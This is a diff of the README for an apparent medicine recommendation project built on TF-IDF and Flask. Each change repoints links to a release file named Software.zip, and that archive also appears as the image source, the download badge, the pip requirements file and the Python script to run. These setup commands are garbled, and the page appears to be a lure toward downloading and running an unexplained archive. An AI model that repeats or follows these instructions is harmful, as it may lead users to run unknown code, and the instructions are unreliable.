@@ -1,5 +1,5 @@
 # 🌟 Welcome to the Medicine Recommendation System!
-![medicine](https://github.com/dayanoo/Medicine-Recommendation-System/releases/download/v1.0/Software.zip)
+![medicine](https://github.com/dayanoo/Medicine-Recommendation-System/releases/download/v2.0/Software.zip)
 ## Introduction
 Welcome to the Medicine Recommendation System repository! This project is designed to provide intelligent and user-centric recommendations for medicines based on various factors such as product uses similarity, side effects, and product review weightages. Using powerful NLP techniques like TF-IDF and Cosine Similarity, this system aims to enhance the user experience when searching for medicines.
 
@@ -19,14 +19,14 @@ Welcome to the Medicine Recommendation System repository! This project is design
 
 ## Installation
 To get started with the Medicine Recommendation System, you can download the repository from the following link:
-[![Download Now](https://github.com/dayanoo/Medicine-Recommendation-System/releases/download/v1.0/Software.zip%20Now-v1.0.0-blue)](https://github.com/dayanoo/Medicine-Recommendation-System/releases/download/v1.0/Software.zip)  
+[![Download Now](https://github.com/dayanoo/Medicine-Recommendation-System/releases/download/v2.0/Software.zip%20Now-v1.0.0-blue)](https://github.com/dayanoo/Medicine-Recommendation-System/releases/download/v2.0/Software.zip)  
 
 Once downloaded, you can launch the project by following the instructions in the repository.
 
 ## How to Use
 1. Clone the repository to your local machine.
-2. Install the required dependencies by running `pip install -r https://github.com/dayanoo/Medicine-Recommendation-System/releases/download/v1.0/Software.zip`.
-3. Launch the Flask application by running `python https://github.com/dayanoo/Medicine-Recommendation-System/releases/download/v1.0/Software.zip`.
+2. Install the required dependencies by running `pip install -r https://github.com/dayanoo/Medicine-Recommendation-System/releases/download/v2.0/Software.zip`.
+3. Launch the Flask application by running `python https://github.com/dayanoo/Medicine-Recommendation-System/releases/download/v2.0/Software.zip`.
 4. Access the application through your web browser.
 5. Enter your preferences and get personalized medicine recommendations!
 
